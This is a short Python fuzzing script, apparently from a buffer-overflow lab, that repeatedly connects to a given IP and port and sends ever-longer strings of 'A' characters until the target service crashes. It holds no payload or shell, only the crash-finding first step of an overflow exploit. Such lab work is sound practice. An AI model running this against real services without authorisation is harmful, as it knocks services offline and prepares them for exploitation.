import socket
import sys

# script stop with 150
# how to execute:
# python overflow.py 192.168.1.109 31337

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 100)

# sending junk
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("Fuzzing: " + str(len(junk)))
        s.send(junk + "\n")
        s.recv(1024)
        s.close()
        junk += ("A" * 10)
    except:
        sys.exit(0)
